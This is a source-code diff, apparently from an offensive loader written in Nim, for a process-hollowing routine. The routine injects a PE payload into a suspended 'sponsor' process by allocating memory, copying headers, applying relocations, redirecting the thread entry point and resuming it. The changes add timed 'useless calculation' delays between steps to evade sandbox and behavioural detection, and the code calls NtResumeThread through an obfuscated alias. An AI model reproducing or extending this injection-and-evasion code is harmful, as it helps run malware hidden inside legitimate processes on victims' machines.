@@ -3,7 +3,7 @@ import ptr_math
 import strutils
 include reloc
 
-proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
+proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION, sleepBetweenSteps: int): bool =
 
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
@@ -43,6 +43,8 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
 
     when defined(hollow1):
         
+        sleepUselessCalculations(sleepBetweenSteps)
+        
         # Allocate memory in sponsor process (preferred address)
         when not defined(release): echo "[*] Allocating memory in sponsor process (preferred address)"    
         var newImageBaseAddress = VirtualAllocEx(
@@ -70,6 +72,8 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
                 
         when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
         when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 
+
+        sleepUselessCalculations(sleepBetweenSteps)
 
         # Copy PE headers to sponsor process 
         when not defined(release): echo "[*] Copying PE headers to sponsor process"    
@@ -115,6 +119,8 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
                 when not defined(release): echo "[-] Could not apply relocations"
                 onFail(sponsorProcessHandle)
 
+        sleepUselessCalculations(sleepBetweenSteps)
+
         # Change sponsor thread Entrypoint
         var context: CONTEXT
         context.ContextFlags = CONTEXT_INTEGER
@@ -128,12 +134,16 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             when not defined(release): echo "[-] Could not write to sponsor process PEB"
             onFail(sponsorProcessHandle)
         
+        sleepUselessCalculations(sleepBetweenSteps)
+
         # Resume remote thread 
         when not defined(release): echo "[*] Resuming remote thread"
         ResumeThread(sponsorThreadHandle)
     
     when defined(hollow2) or defined(hollow3):
+        
         var res: NTSTATUS
+        sleepUselessCalculations(sleepBetweenSteps)
         
         # Allocate memory in sponsor process (preferred address)
         when not defined(release): echo "[*] Allocating memory in sponsor process (preferred address)"   
@@ -166,6 +176,8 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
                 
         when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
         when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 
+
+        sleepUselessCalculations(sleepBetweenSteps)
 
         # Copy PE headers to sponsor process 
         when not defined(release): echo "[*] Copying PE headers to sponsor process"    
@@ -211,6 +223,8 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
                 when not defined(release): echo "[-] Could not apply relocations"
                 onFail(sponsorProcessHandle)
 
+        sleepUselessCalculations(sleepBetweenSteps)
+
         # Change sponsor thread Entrypoint
         var context: CONTEXT
         context.ContextFlags = CONTEXT_INTEGER
@@ -234,6 +248,8 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             when not defined(release): echo "[-] Could not write to sponsor process PEB"
             onFail(sponsorProcessHandle)
             
+        sleepUselessCalculations(sleepBetweenSteps)
+        
         # Resume remote thread 
         when not defined(release): echo "[*] Resuming remote thread"
         if mAcJDfMgbUNFgsxu( # NtResumeThread
